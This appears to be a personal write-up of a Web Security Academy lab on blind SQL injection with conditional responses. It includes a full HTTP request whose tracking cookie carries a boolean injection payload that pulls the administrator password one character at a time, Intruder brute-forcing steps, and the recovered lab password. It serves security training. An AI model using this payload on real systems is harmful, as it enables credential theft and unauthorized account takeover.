# Blind SQL injection with conditional responses

1. Note that a normal request includes "Welcome back!" in the response

![[attachments/sqli-lab-11/file-20260204113218141.png]]

2. Note that the original query returns one column

![[attachments/sqli-lab-11/file-20260204113424472.png]]

3. Send the following request to find the first letter of the admin password

```
GET /filter?category=Gifts HTTP/2
Host: 0af200cf04af4708ecc08d67001b00c1.web-security-academy.net
Cookie: TrackingId=0RYWrCh4AaZiCmET' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a; session=PmJdK7Uv8nsfM9zsoEWGenb6rhsTSMDq
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0af200cf04af4708ecc08d67001b00c1.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```

4. Set placeholders in the substring and in the value in intruder and run the attack

![[attachments/sqli-lab-11/file-20260204115432046.png]]

5. Find the following the password

```
jku5xsl2rb1d8z2jp61e
```

6. Sign in as the administrator to solve the lab

